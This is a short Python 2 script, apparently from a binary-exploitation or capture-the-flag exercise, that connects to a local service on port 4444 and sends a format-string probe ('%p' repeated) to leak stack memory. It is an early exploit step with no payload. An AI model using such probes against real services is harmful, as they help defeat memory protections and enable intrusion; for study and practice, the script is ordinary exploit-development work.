#!/usr/bin/python2

import socket
from time import sleep
from struct import pack

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4444))

raw_input('de')

sleep(1)
print s.recv(1024)

s.send('a' * 16)
sleep(1)
print s.recv(1024)

s.send('aaaaaaaaa' + '%p\t' * 16)
sleep(1)
print s.recv(4096)
